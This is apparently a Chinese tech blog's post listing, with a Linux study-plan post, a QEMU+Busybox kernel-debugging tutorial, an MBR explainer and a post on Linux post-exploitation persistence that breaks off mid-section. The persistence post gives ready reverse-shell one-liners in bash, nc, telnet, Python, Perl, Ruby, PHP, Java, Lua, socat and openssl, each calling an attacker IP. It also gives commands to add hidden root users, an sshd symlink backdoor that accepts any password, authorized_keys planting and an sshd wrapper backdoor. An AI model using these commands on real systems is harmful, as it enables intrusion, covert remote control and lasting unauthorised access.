Linux操作系统，目前服务器领域体量最大的操作系统。之前学习操作系统时，并未单独对Linux操作系统进行深入的学习和理解，仅仅停留在常规使用和运维层面，而且只在需要时对部分功能和过程进行了深入的探索。在学习编程时，也并没有将Linux当作编程主力，当时还主要是在做Windows平台下的开发，因此对于Unix平台和类平台的编程开发能力相对较弱。基于以上两点，我觉得从头再完整过一遍Linux，将Linux相关内容整理成完整的知识体系架构。 学习过程中我会简单记录中间遇到的重点和问题，这些问题可能需要一定的基础才能理解，本系列部分内容可能对于新手并不友好（仅仅是部分内容，相信大部分大家还是都能看懂的）。 ","date":"2021-01-02","objectID":"/2021/Linux/description/:1:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2021/Linux/description/"},{"categories":["Tech"],"content":"内容划分 目前计划将Linux相关内容整体上划分为两部分 – 操作系统和Unix编程（以Linux为开发平台），后续如果时间和精力允许的情况下，可能会更新部分Linux安全相关的内容 – 漏洞（偏分析）和攻防（偏技巧）。 操作系统部分会大致按照常规操作系统的课程来安排内容，中间会参考部分公开课和各种书籍、博客等，均会给出相关链接和引用说明，方便大家更好地找到资源。 Unix编程部分则会按照《Unix环境高级编程（第3版）》和《Unix网络编程》来安排内容，中间会对部分内容做扩充，也会对一些基础知识做裁剪，争取只保留干货和精华。 漏洞部分暂时的编排还没确定，主要担心时间精力不够，出现质量偏低的情况。但总原则是以漏洞分析为主，漏洞挖掘为补充。漏洞分析将会介绍规范化的漏洞分析流程，漏洞挖掘部分将介绍自己学习漏洞挖掘的过程。 攻防部分暂时的编排也没确定，总原则是以渗透和漏洞利用技巧为主，主要是做各种技巧的搜集整理。 ","date":"2021-01-02","objectID":"/2021/Linux/description/:2:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2021/Linux/description/"},{"categories":["Tech"],"content":"更新周期 更新时间不定，总原则是每周至少更新一次，争取一年内更新完操作系统部分和Unix编程的1/2内容。 最后，附上自己喜欢的一句话：人世纷乱，出入平安。 ","date":"2021-01-02","objectID":"/2021/Linux/description/:3:0","tags":["Linux"],"title":"Linux操作系统的大千世界 -- 综述","uri":"/2021/Linux/description/"},{"categories":["Tech"],"content":"QEMU + Busybox编译Linux内核","date":"2020-12-23","objectID":"/2020/12/qemu/","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"QEMU + Busybox 模拟 Linux 内核环境 ","date":"2020-12-23","objectID":"/2020/12/qemu/:0:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"前言 最近转Linux平台，开始深入Linux内核相关，总结一下进行Linux内核环境模拟流程。结合Linux的内核源码一起，效果会比较好。 ","date":"2020-12-23","objectID":"/2020/12/qemu/:1:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"准备环境 ","date":"2020-12-23","objectID":"/2020/12/qemu/:2:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"主机环境 Ubuntu 18.04 Linux ubuntu 5.4.0-58-generic #64~18.04.1-Ubuntu SMP Wed Dec 9 17:11:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux ","date":"2020-12-23","objectID":"/2020/12/qemu/:2:1","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"需要使用的软件 使用主流的qemu+busybox进行模拟，底层的模拟实现软件内部完成，可以将重心放在内核调试上，避免在环境上浪费过多时间。qemu模拟器原生即支持gdb调试器，所以可以方便地使用gdb的强大功能对操作系统进行调试。 首先安装qemu，依次执行以下命令： sudo apt-get install qemu sudo apt-get install qemu-system sudo apt-get install qemu-user-static 这里不建议使用源码编译的方式进行安装，个人建议是节省时间在核心工作上，工具越快搭建好越能提升效率。源码编译涉及到编译器和主机环境各异性的问题，中间可能出现各种情况，浪费时间。（注意，安装好后，无法直接qemu无法运行，需要使用qemu-system-i386, qemu-system-x86_64, qemu-system-arm这种格式的命令进行运行。如果嫌麻烦，可以设置软链接。） 安装busybox，直接busybox的github上拖源码下来即可。在实际进行文件系统制作的时候再进行其他操作。 最后是下载想进行编译的Linux内核源码，这里给出一个各个版本的Linux内核源码集合。 ","date":"2020-12-23","objectID":"/2020/12/qemu/:2:2","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"编译调试版内核 ","date":"2020-12-23","objectID":"/2020/12/qemu/:3:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"编译正常流程 首先对Linux内核进行编译： cd linux-3.18.6 make menuconfig make bzImage 注意，这里在进入menuconfig后，需要开启内核参数CONFIG_DEBUG_INFO和CONFIG_GDB_SCRIPTS。gdb提供了python接口进行功能扩展，内核基于python接口实现了一系列辅助脚本来简化内核的调试过程。 Kernel hacking ---\u003e [*] Kernel debugging Compile-time checks and compiler options ---\u003e [*] Compile the kernel with debug info [*] Provide GDB scripts for kernel debuggin ","date":"2020-12-23","objectID":"/2020/12/qemu/:3:1","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"编译可能遇到的问题 执行make bzImage时遇到的问题： fatal error: linux/compiler-gcc7.h: No such file or directory 提示缺少compiler-gcc7.h这个文件，是由于内核版本较低和gcc版本不匹配造成的有三种解决方法： 1.在内核文件夹中include/linux目录下找到compiler-gcc4.h文件，不同内核版本可能不一样，也有可能是compiler-gcc3.h,将它重命名为compiler-gcc7.h。然后重新编译一下就好了。 2.在新的内核源码中拷贝一个compiler-gcc7.h，将它拷贝到内核文件夹include/linux目录下，重新编译即可。 3.重装一个版本低一点的gcc。 fatal error: asm/types.h: No such file or directory linux添加到asm-generic的软链接: ln -s /usr/include/asm-generic asm ","date":"2020-12-23","objectID":"/2020/12/qemu/:3:2","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"制作initramfs根文件系统 Linux启动阶段，boot loader加载完内核文件vmlinuz之后，便开始挂载磁盘根文件系统。挂载操作需要磁盘驱动，所以挂载前要先加载驱动。但是驱动位于/lib/modules，不挂载磁盘就访问不到，形成了一个死循环。initramfs根文件系统就可以解决这个问题，其中包含必要的设备驱动和工具，boot loader会加载initramfs到内存中，内核将其挂载到根目录，然后运行/init初始化脚本，去挂载真正的磁盘根文件系统。 ","date":"2020-12-23","objectID":"/2020/12/qemu/:4:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"编译busybox 首先需要注意，busybox默认编译的文件系统是和主机OS一样的位数，也就是Ubuntu是x86的，编译出的文件系统就是x86的，如果Ubuntu是x64的，编译出的文件系统是x64的。要保持前面编译的Linux内核和文件系统的位数一样。 cd busybox-1.32.0 make menuconfig make -j 20 make install 进入menu后，修改参数如下： 其次，修改为静态链接： Settings ---\u003e [*] Build static binary (no shared libs) 然后再执行make和install操作。 ","date":"2020-12-23","objectID":"/2020/12/qemu/:4:1","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"创建initramfs 编译成功后，会生成_install目录，其内容如下： $ ls _install bin linuxrc sbin usr 依次执行如下命令： mkdir initramfs cd initramfs cp ../_install/* -rf ./ mkdir dev proc sys sudo cp -a /dev/{null, console, tty, tty1, tty2, tty3, tty4} dev/ rm linuxrc vim init chmod a+x init 其中init文件的内容如下： #!/bin/busybox sh mount -t proc none /proc mount -t sysfs none /sys exec /sbin/init 在创建的initramfs中包含busybox可执行程序、必须的设备文件、启动脚本init，且init只挂载了虚拟文件系统procfs和sysfs，没有挂载磁盘根文件系统，所有操作都在内存中进行，不会落地。 最后打包initramfs： find . -print0 | cpio --null -ov --format=newc | gzip -9 \u003e ../initramfs.cpio.gz ","date":"2020-12-23","objectID":"/2020/12/qemu/:4:2","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"启动内核 qemu-system-i386 -s -kernel /path/to/bzImage -initrd initramfs.cpio.gz -nographic -append \"console=ttyS0\" 参数说明： -s是-gdb tcp::1234缩写，监听1234端口，在GDB中可以通过target remote localhost:1234连接； -kernel指定编译好的调试版内核； -initrd指定制作的initramfs; -nographic取消图形输出窗口； append \"console=ttyS0\"将输出重定向到console，将会显示在标准输出stdio。 启动后的根目录，就是initramfs中包含的内容： 至此，一个简单的内核就算编译完成了，可以挂gdb进行调试了。 ","date":"2020-12-23","objectID":"/2020/12/qemu/:5:0","tags":["Security"],"title":"QEMU + Busybox 模拟 Linux 内核环境","uri":"/2020/12/qemu/"},{"categories":["Tech"],"content":"MBR简介","date":"2020-12-14","objectID":"/2020/12/MBR/","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"MBR简介 ","date":"2020-12-14","objectID":"/2020/12/MBR/:0:0","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"一、磁盘结构 ","date":"2020-12-14","objectID":"/2020/12/MBR/:1:0","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"1、磁盘的物理结构 磁盘结构可分为外部结构和内部结构，外部结构主要包括金属固定面板、控制电路板和接口三部分： 其中控制电路板部分包括了主轴调速电路、磁头驱动与伺服定位电路、读写电路、控制与接口电路等，几个主要的芯片：主控芯片、BIOS芯片、缓存芯片、电机驱动芯片；接口部分则一般有几个不同的硬盘接口，主要包括电源插座接口、数据接口和主从跳线接口（设置主、从硬盘，即磁盘驱动器的访问顺序）。 磁盘的内部结构如下： 内部结构则主要有以下几个核心部件： 1. 磁头组件 包括读写磁头、传动手臂、传动轴三部分，最重要的是磁头。传动轴带动传动比，使磁头到达指定位置。磁头是用线圈缠绕在磁芯上制成的，工作原理是利用特殊材料的电阻值会随着磁场变化的原理来读写盘片上的数据。硬盘在工作时，磁头通过感应旋转的盘片上磁场的变化来读取数据；通过改变盘片上的磁场来写入数据。为避免磁头和盘片的磨损，在工作状态时，磁头悬浮在高速转动的盘片上方，间隙只有0.1~0.3um，而不是盘片直接接触，在电源关闭之后，磁头会自动回到在盘片上着陆区，此处盘片并不存储数据，是盘片的起始位置。 2. 磁头驱动组件 磁头的移动是靠磁头驱动组件实现的，硬盘寻道时间的长短与磁头驱动组件关系非常密切。 3. 盘片与主轴组件 盘片是硬盘存储数据的载体，主要是在铝合金或玻璃基底上涂覆很薄的磁性材料、保护材料和润滑材料等多种不同作用的材料层加工而成，其中磁性材料的物理性能和磁层结构直接影响了数据的存储密度和所存储数据的稳定性。玻璃盘片比金属盘片在运行时具有更好的稳定性。 4. 前置控制电路 前置放大电路控制磁头感应的信号、主轴电机调速、磁头驱动和伺服定位等，由于磁头读取的信号微弱，将放大电路密封在腔体内可减少外来信号的干扰，提高操作指令的准确性。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:1:1","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"2、逻辑结构 磁盘在使用前需要先进行格式化，该过程主要是在逻辑上为每个盘片划分磁道、扇区、柱面等这几个虚拟概念。下图为磁盘的逻辑结构： 磁道 当磁盘旋转时，磁头若保持在一个位置上，则每个磁头都会在磁盘表面划出一个圆形轨迹，该轨迹就称为磁道。磁道是一个个同心圆，通常盘面的一面有成千上万个磁道，磁盘上的信息是沿着轨道进行存放，相邻的磁道间保持一定距离，避免磁化单元相近时会互相影响，也为磁头进行数据读写时降低难度。 扇区 每个盘片的每一面都会划分很多同心圆的磁道，而且还会将每个同心圆进一步分割为多个相等的圆弧，这些圆弧就是扇区（也称扇面）。数据则以扇区为单位进行存储，扇区也是磁盘I/O操作的最小单位（即使只需要某个扇区的几个字节，计算机也必须一次性将整个扇区的全部512字节读入内存，然后再进行数据筛选。）。扇区通常包含标题、数据、ECC(Error Correcting Code)纠错信息，其中标题包含同步和位置信息，ECC功用是对数据段提供错误侦测和纠正。 柱面 硬盘通常由一个或多个盘片构成，而且每个面都被划分为数目相等的磁道，并从外缘开始编号（即最边缘的磁道为0磁道，往里依次累加）。如此磁盘中具有相同编号的磁道会形成一个圆柱，此圆柱称为磁盘的柱面。磁盘的柱面数与一个盘面上的磁道数是相等的。由于每个盘面都有一个磁头，因此，盘面数等于总的磁头数。 对磁盘进行分区的主要目的是为了不同类的目录与文件可以存储进不同的分区，越多分区，也就有更多不同的地方，可以将文件的性质区分得更细，按照更为细分的性质，存储在不同的地方以管理文件。总结下分区的优点： 优化I/O性能 实现磁盘空间配额限制 提高修复速度 隔离系统和程序 安装多个OS 采用不用的文件系统 磁盘结构的3D参数：CHS，C-Cylinder，柱面；H-Head，磁头；S-Sector，扇区。 最后是磁盘的容量 = 柱面数 * 磁头数 * 扇区数 * 512Bytes ，相关的编号方式是：磁道从外到内编号，最外层是0号磁道；扇区的编号为固定标记某块为1号，然后顺时针编号；磁头则是决定读写面号的结构，从0开始顺序编号。 在老式磁盘中，虽然磁道周长不同，但是每个磁道上的扇区数是相同的，越往圆心扇区弧段越短，但其存储密度越高。这种方式显而易见，很浪费空间，所以现代磁盘修改为等密度结构，这也就是说，外围磁道上的扇区数要大于内圈磁道的扇区数，寻址方式上也改为以扇区为单位的线性寻址。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:1:2","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"二、MBR 磁盘有2种分区方式：MBR和GPT。MBR，全称为Master Boot Record，主引导记录，是指磁盘第1块扇区上的一种数据结构。它在磁盘上的三维地址（柱面，磁头，扇区） = （0，0，1）。这里需要注意，在讨论引导扇区内部结构的时候，有时指的其开头的446字节内容，其后4个16字节的数据是磁盘分区表（DPT），以及2字节的结束标志“55AA”。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:2:0","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"1. MBR结构 MBR记录了磁盘本身的相关信息以及磁盘各个分区的大小及位置信息。MBR内的信息可以通过任何一种基于某种操作系统的分区工具软件写入，和OS没有特定关系，即只要创建了有效的MBR就可以引导某一种OS（因为OS是创建在高级格式化的磁盘分区上的，是和一定的文件系统相关联的）。 一个标准的MBR结构如下： 首先使用dd if=/dev/sda of=mbr.bin bs=1 count=512命令将mbr中的数据导出成mbr.bin后，然后使用hexdump查看bin文件中的数据： 后续将对该文件中的各个部分的数据做详细解读。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:2:1","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"2. MBR与磁盘分区 MBR的分区方式为4个主分区或3个主分区+1个扩展（N个逻辑分区）。MBR磁盘分区的结构示意图如下： 因为MBR仅仅包含一个64字节大小的DPT，而每个分区需要16字节，所对于采用MBR型分区的磁盘最多只能识别4个主要分区（Primary partition）。如果想获得4个以上的主要分区，就需要使用扩展分区，扩展分区也是主分区的一种，不同点是扩展分区可以在理论上划分成无数个逻辑分区。 扩展分区，它仅仅是一个指向下一个分区的指针，逻辑驱动器的引导记录是链式的。每一个逻辑分区都有一个和MBR结构类似的扩展引导记录（EBR），其分区表的第一项指向该逻辑分区本身的引导扇区，第二项指向下一个逻辑驱动器的EBR，分区表第三、第四项没有用到。 Windows系统默认情况下，一般都是只划分一个主分区给系统，剩余的部分全部划入扩展分区。这里有下面几点需要注意： 在MBR分区表中最多4个主分区或者3个主分区＋1个扩展分区，也就是说扩展分区只能有一个，然后可以再细分为多个逻辑分区。 在Linux系统中，磁盘分区命名为sda1－sda4或者hda1－hda4（其中a表示磁盘编号可能是a、b、c等等）。在MBR磁盘中，分区号1－4是主分区（或者扩展分区），逻辑分区号只能从5开始。 在MBR分区表中，一个分区最大的容量为2T，且每个分区的起始柱面必须在这个disk的前2T内。你有一个3T的磁盘，根据要求你至少要把它划分为2个分区，且最后一个分区的起始扇区要位于磁盘的前2T空间内。如果磁盘太大则必须改用GPT。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:2:2","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"3. MBR组成 1. 启动代码 MBR最开头是第一阶段引导代码，其中的磁盘引导程序的主要作用是检查分区表是否正确并且在系统硬件完成自检以后将控制权交给磁盘上的引导程序（如grub）。它不依赖任何操作系统，而且启动代码可以改变，从而实现多系统引导。代码区最大长度为446字节。 2. 磁盘分区表 大小为64字节，偏移01be-01fd，对四个分区的信息进行描述，其中每个分区的信息占16个字节。一个详细的磁盘分区结构各字节含义表如下： 例如，某一分区在磁盘分区表的信息如下： 80 01 01 00 0B FE BF FC 3F 00 00 00 7E 86 BB 00 首字节80为分区的激活标志，表示为活动分区，可被系统引导；01 01 00表示分区开始的磁头号为1，扇区好为1，柱面号为0；0b表示分区的系统类型为FAT32，其他比较常用的有04（FAT16）、07（NTFS）；fe bf fc表示分区结束的磁头号为254，分区结束的扇区号为63，分区结束的柱面号为764；3f 00 00 00表示首扇区的相对扇区号为63（小端）；7e 86 bb 00表示总扇区数为12289662（小端）。 （这里需要注意，对于大于8.4G的现代磁盘，CHS的方式已经无法表示，BIOS使用LBA模式，对于超出的部分，CHS值通常设定为0xfeffff，并加以忽略，直接使用偏移0x08-0x0c的4字节相对值，再进行内部转换。） 3. 结束标志字 55 AA，偏移1feh-1ffh，最后2个字节，是检验MBR是否有效的标志。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:2:3","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"4. 主引导扇区的读取流程 系统开机或者重启。 BIOS上电自检（Power On Self Test – POST）。BIOS执行内存地址为FFFF:0000H处的跳转指令，跳转到固化在ROM中的自检程序处，对系统硬件（包括内存）进行检查。 读取主引导记录（MBR）。当BIOS检查到硬件正常并与CMOS中的设置相符后，按照CMOS中对启动设备的设置顺序检测可用的启动设备。BIOS将相应启动设备的第一个扇区（也就是MBR扇区）读入内存地址为0000:7C00H处。 检查0000:7DFEH-0000:7DFFH（MBR的结束标志位）是否等于55AAH，若不等于则转去尝试其他启动设备，如果没有启动设备满足要求则显示\"NO ROM BASIC\"然后死机。 当检测到有启动设备满足要求后，BIOS将控制权交给相应启动设备。启动设备的MBR将自己复制到0000:0600H处，然后继续执行。 根据MBR中的引导代码启动引导程序。 事实上，BIOS不仅检查0000:7DFEH-0000:7DFFH（MBR的结束标志位）是否等于55AAH，往往还对磁盘是否有写保护、主引导扇区中是否存在活动分区等进行检查。如果发现磁盘有写保护，则显示磁盘写保护出错信息；如果发现磁盘中不存在活动分区，则显示类似如下的信息“Remove disk or other media Press any key to restart”。 ","date":"2020-12-14","objectID":"/2020/12/MBR/:2:4","tags":["Security"],"title":"MBR简介","uri":"/2020/12/MBR/"},{"categories":["Tech"],"content":"简单总结下Linux平台下的反弹shell方法和权限维持方法","date":"2020-12-13","objectID":"/2020/12/Backdoor/","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"权限维持 – Linux ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:0:0","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"一、Basic Knowledge ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:1:0","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"1. 概念 可以简单理解为通过隐藏手段或在目标上安装后门以保持已获取的权限不会被打掉，一直控制目标，属于后渗透阶段的重点内容。 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:1:1","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"2. 前置条件 – 获取初始权限 获取初始权限。最常见也是个人最喜欢的是反弹shell回来，方便后续操作。这里简单总结下反弹shell的常见手法： 1. Bash反弹 攻击机监听： nc -lvvp port 目标执行： bash -i \u003e\u0026 /dev/tcp/x.x.x.x/port 0\u003e\u00261 或者 bash -i 5\u003c\u003e/dev/tcp/host/port 0\u003e\u00265 1\u003e\u00265 bash -i：打开一个交互的bash \u003e\u0026 /dev/tcp/x.x.x.x/port：调用socket建立链接，x.x.x.x为要接收shell的主机ip，port为端口，将标准错误和标准输出重定向到socket连接文件。 0\u003e\u00261：标准输入重定向到标准输出，此时标准输出指向socket连接，从而实现了与反弹shell的交互。 第二种则是将标准输入、输出和错误均重定向到socket连接文件。 备注：Linux不同发行版之间存在差异，某些命令可能并不适用，可自行调整。 2. telnet反弹 第一种： 攻击机开2个终端，分别执行监听： nc -lv port1 和 nv -lv port2 目标主机执行： telent x.x.x.x port1 | /bin/bash | telnet x.x.x.x port2 监听2个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip。 第二种： 攻击机监听： nc -lv port 目标主机执行： rm -f /tmp/a;mknod /tmp/a p;telnet x.x.x.x port 0\u003c/tmp/a | /bin/bash 1\u003etmp/a 其中x.x.x.x为攻击机ip。 3. nc(netcat)反弹 攻击机监听： nc -lv port 目标执行： nc -e /bin/bash x.x.x.x port 如果目标上没有-e参数可以使用以下命令： rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2\u003e$1 | nc x.x.x.x port \u003e/tmp/f mkfifo的作用是创建FIFO特殊文件，也称为命名管道。FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行读写操作，本质上就是在读写内核通道，这样就可以实现进程间通信。 此外，也可以使用telnet的监听2个端口的方式： nc x.x.x.x port1 | /bin/bash | nc x.x.x.x port2 4. 常见脚本反弹 下述脚本均需要现在攻击机上开启监听：nc -lv port，将脚本中ip替换为对应的攻击机IP，port替换为实际使用的端口。 1. Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' 2. Perl 第一种： perl -e 'use Socket;$i=\"x.x.x.x\";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' 第二种： perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"x.x.x.x:port\");STDIN-\u003efdopen($c,r);$~-\u003efdopen($c,w);system$_ while\u003c\u003e;' 3. Ruby 第一种： ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"x.x.x.x\",\"port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' 第二种： ruby -rsocket -e'f=TCPSocket.open(\"x.x.x.x\",port).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' 4. PHP php -r '$sock=fsockopen(\"x.x.x.x\",port);exec(\"/bin/bash -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' 5. Java public class Revs { /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception { // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= {\"/bin/bash\",\"-c\",\"exec 5\u003c\u003e/dev/tcp/x.x.x.x/port;cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done\"}; Process p = r.exec(cmd); p.waitFor(); } } 6. Lua lua -e \"require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','port');os.execute('/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263');\" 3. 其他方法 1. socat 攻击机监听： socat file:`tty`,raw,echo=0 tcp-listen:port 上传socat到目标主机，然后执行： socat exec:'bash -li',pty,stderr,setid,sigint,sane tcp x.x.x.x:port 2. 只有80和443端口且反弹shell流量被拦截 方法论：加密流程，绕过拦截 Step 1：VPS上生成SSL证书的公钥/私钥对 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes Step 2：VPN监听反弹shell openssl s_server -quiet -key key.pem -cert cert.pem -port 443 Step 3：连接 mkfifo /tmp/v4ler1an;/bin/bash -i \u003c /tmp/v4ler1an 2\u003e\u00261 |openssl s_client -quiet -connect x.x.x.x:443 \u003e /tmp/v4ler1an 此时的shell存在缺陷（无法命令补全等），通过以下方法修复： python -c 'import pty; pty.spawn(\"/bin/bash\")' pty是一个伪终端模块。pty.spawn(argv[, master_read[, stdin_read]])产生一个进程，并将其控制终端与当前进程的标准输入输出连接。这通常用于阻挡坚持从控制终端读取的程序。向函数 master_read 和 stdin_read 传递了文件描述符，它们应从中读取，并且它们应始终返回字节字符串。两个函数的默认实现在每次函数被调用时将读取并返回至多 1024 个字节。 会向 master_read 回调传入伪终端的主文件描述符以从子进程读取输出，而向 stdin_read 传入文件描述符 0 以从父进程的标准输入读取数据。 在 3.4 版更改: spawn() 现在从子进程的 os.waitpid() 返回状态值 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:1:2","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"二、权限维持方法 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:0","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"1. 一句话添加用户和密码 添加普通用户： # 创建一个用户名guest，密码为123456的普通用户 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest # useradd -p 方法 `` 是用来存放可执行的系统命令。“$()”也可以存放命令执行语句。 useradd -p \"$(openssl passwd -1 123456)\" guest # chpasswd方法 useradd guest;echo 'guest:123456'|chpasswd # echo -e方法 useradd guest;echo -e \"123456\\n123456\\n\" |passwd guest 添加root用户： # 创建一个用户名为guest，密码为123456的root用户 useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/guest 排查方法： # 查询特权用户（uid = 0） awk -F: '$3==0{print $1}' /etec/passwd # 查询可以远程登录的帐号信息 awk '/\\$1|\\$6/{print $1}' /etc/shadow # 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限 more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:1","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"2. 增加超级用户 在完成用户添加后，可以对添加的用户赋予超级用户权限。 目标主机执行： echo \"v4ler1an❌0:0::/:/bin/sh\" \u003e\u003e /etc/passwd 如果目标系统不允许uid=0的用户远程登录，可以增加一个普通用户账号： echo \"v4ler1an:👎-1👎-1👎-1:500\" \u003e\u003e /etc/shadow 有些情况下添加不成功可能是因为密码强度不够，可以适当增加密码强度。 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:2","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"1. SSH后门 1. sshd 软连接 目标主机建立软连接： ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; 攻击机直接ssh登录 ssh root@x.x.x.x -p 5555 这里端口可以任意，但是/tmp/su部分有限制。可以使用任意密码进行登录，在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 /tmp/su 在/etc/pam.d/目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是auth sufficient pam_rootok.so，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。具体原理详见Linux的一个后门引发对PAM的探究。 缺点：易被排查，通过进程、端口可以轻松看到异常，使用kill -s 9 PID即可清除后门。 2. ssh免密后门(文件落地) 在攻击机上生成一对公私钥，然后将公钥上传到目标主机，路径为~/.ssh/authorized_keys，攻击机本地保存私钥。通过ssh登录，ssh程序会发送私钥到目标主机与公钥进行匹配，匹配通过即可实现ssh登录。 生成公钥和私钥： ssh-keygen -t rsa 进入/root/.ssh，将公钥id_rsa.pub的内容复制到目标主机（是否上传替换文件取决于具体情况），在/root/.ssh/authorized_keys中追加id_rsa.pub中的内容，配置完成。(有些系统没有keys文件，可以自行创建一个。) 缺点：易被排查，检查/root/.ssh/authorized_keys是否被修改，清理不受信的公钥即可清除后门。 3. ssh wrapper（文件落地） 目标主机上执行： cd /usr/sbin/ mv sshd ../bin/ echo '#!/usr/bin/perl' \u003esshd echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' \u003e\u003esshd echo 'exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' \u003e\u003esshd chmod u+x sshd /etc/init.d/sshd restart 完成后执行cat sshd进行验证，输出如下则说明配置成功： #!/usr/bin/perl exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/); exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV, 攻击机上执行： socat STDIO TCP4:x.x.x.x:22,sourceport=13377 这里的sourceport可以进行修改，但是需要使用python的struct标准库实现。 python 